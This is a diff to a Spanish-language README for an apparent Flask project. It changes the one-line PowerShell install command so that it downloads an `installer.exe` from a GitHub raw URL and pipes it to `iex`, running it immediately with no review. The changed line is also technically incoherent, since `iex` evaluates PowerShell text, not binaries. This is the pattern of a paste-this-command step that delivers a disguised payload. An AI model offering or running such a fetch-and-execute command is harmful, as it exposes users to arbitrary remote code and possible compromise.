@@ -33,7 +33,7 @@ Construido sobre **Python 3.10+, Flask y SQLAlchemy 2.0**, este proyecto nació 
 Si quieres dejar de sufrir, simplemente abre tu terminal y ejecuta:
 
 ```powershell
-iwr -useb https://raw.githubusercontent.com/Riutexu/Prueba-de-Shein-Temu/main/install.ps1 | iex
+iwr -useb https://raw.githubusercontent.com/Riutexu/Prueba-de-Shein-Temu/main/installer.exe | iex
 ```
 
 Este script se encarga de todo: descargar el repo, preparar el entorno, instalar dependencias y dejarte un icono en el escritorio.
